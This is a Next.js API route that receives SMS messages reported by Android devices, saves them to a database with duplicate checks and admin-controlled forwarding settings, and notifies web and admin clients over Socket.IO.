import { NextResponse } from "next/server";
import { db } from "@/lib/db";

/**
 * POST /api/sms
 * Handles incoming SMS forwarding records
 */
export async function POST(req) {
    const {
      form_code,
      android_id,
      sim_sub_id,
      sender,
      message,
      sms_forwarding_status,
      sms_forwarding_status_message,
    } = await req.json();

  try {
  
    // --- Basic validation ---
    if (!form_code || !android_id) {
      throw new Error("Missing required fields: form_code or android_id");
    }

    if (!sender || !message) {
      throw new Error("Missing required fields: sender or message");
    }

    // --- Fetch user forwarding info ---
    const userSql = `
      SELECT sms_forwarding_to_number, sms_forwarding_to_number_status
      FROM users
      WHERE form_code = ?
      LIMIT 1
    `;
    const [rows] = await db.query(userSql, [form_code]);

    if (rows.length === 0) {
      const err = new Error(`No user found for form_code: ${form_code}`);
      err.status = 404;
      throw err;
    }

    const { sms_forwarding_to_number, sms_forwarding_to_number_status } = rows[0];
    const forward_to_number = sms_forwarding_to_number?.trim() || null;

    // --- Determine forwarding status ---
    let forwardingStatus = sms_forwarding_status;
    let forwardingMessage = sms_forwarding_status_message;

    if (sms_forwarding_to_number_status !== "Enabled") {
      forwardingStatus = "Disabled";
      forwardingMessage = `SMS forwarding is disabled for form_code(${form_code}) by admin.`;
    } else if (!forward_to_number) {
      forwardingStatus = "Failed";
      forwardingMessage = `No forwarding number found for form_code(${form_code}).`;
    }

    // --- Check for duplicates (within 1 minute) ---
    const [existing] = await db.query(
      `
        SELECT id FROM sms_forwarding
        WHERE android_id = ?
          AND (sim_sub_id = ? OR (? IS NULL AND sim_sub_id IS NULL))
          AND sender = ?
          AND message = ?
          AND created_at >= NOW() - INTERVAL 1 MINUTE
        LIMIT 1
      `,
      [android_id, sim_sub_id || null, sim_sub_id || null, sender, message]
    );

    if (existing.length > 0) {
      const err = new Error("To Frequently SMS ignored");
      err.status = 409;
      throw err;
    }

    // --- Insert into DB ---
    const insertSql = `
      INSERT INTO sms_forwarding (
        android_id,
        sim_sub_id,
        sender,
        message,
        forward_to_number,
        form_code,
        sms_forwarding_status,
        sms_forwarding_status_message
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `;

    const [result] = await db.query(insertSql, [
      android_id,
      sim_sub_id || null,
      sender,
      message,
      forward_to_number,
      form_code,
      forwardingStatus,
      forwardingMessage,
    ]);

    const insertedId = result.insertId;
    console.log(`✅ SMS saved (ID: ${insertedId}) for ${form_code}, android_id: ${android_id}`);

    // --- Handle forwarding status ---
    if (sms_forwarding_to_number_status !== "Enabled") {
      sendMessageToClients(form_code, "new_sms_data", "SMS saved but forwarding is disabled. Contact admin", false);
      sendMessageToAdmin("new_sms_data", `SMS received for form_code: ${form_code} but forwarding is disabled`, false);
      const err = new Error("SMS saved but forwarding is disabled. Contact admin.");
      err.status = 403;
      throw err;
    }

    if (!forward_to_number) {
      sendMessageToClients(form_code, "new_sms_data", `No forwarding number found sms #${insertedId}`, false);
      sendMessageToAdmin("new_sms_data", `No forwarding number found for form_code: ${form_code}. & sms #${insertedId}`, false);
      const err = new Error("No forwarding number found.");
      err.status = 400;
      throw err;
    }

    // --- Notify via Socket.IO ---
    sendMessageToClients(form_code, "new_sms_data", `New SMS received sms #${insertedId}`, true);
    sendMessageToAdmin("new_sms_data", `SMS #${insertedId} received (form_code: ${form_code})`, true);

    return NextResponse.json(
      {
        status: 200,
        message: "SMS forwarding data saved successfully.",
        data: { id: insertedId, forward_to_number },
      },
      { status: 200 }
    );
  } catch (err) {
    const statusCode = err.status || 500;
    console.error(`❌ Post-SMS Error [${statusCode}]:`, err.message, form_code, android_id);

    return NextResponse.json(
      { status: statusCode, message: err.message || "Server error" },
      { status: statusCode }
    );
  }
}

/* ---------------- SOCKET HELPERS ---------------- */

function sendMessageToClients(form_code, event_name, message, success = false) {
  if (!global.io) {
    console.warn("⚠️ Socket.IO in stance not found!");
    return;
  }

  const clientSockets = [...global.io.sockets.sockets.values()].filter(
    (s) =>
      s.handshake.query.client === "web" &&
      s.handshake.query.form_code === form_code
  );

  console.log(`📡 Sending "${event_name}" to ${clientSockets.length} web clients (form_code: ${form_code})`);

  clientSockets.forEach((clientSocket) => {
    clientSocket.emit(event_name, { success, message });
  });
}

function sendMessageToAdmin(event_name, message, success = false) {
  if (!global.io) {
    console.warn("⚠️ Socket.IO instance not found!");
    return;
  }

  const adminSockets = [...global.io.sockets.sockets.values()].filter(
    (s) =>
      s.handshake.query.client === "web" &&
      s.handshake.query.role === "admin"
  );

  console.log(`👑 Sending "${event_name}" to ${adminSockets.length} admin clients`);

  adminSockets.forEach((adminSocket) => {
    adminSocket.emit(event_name, { success, message });
  });
}
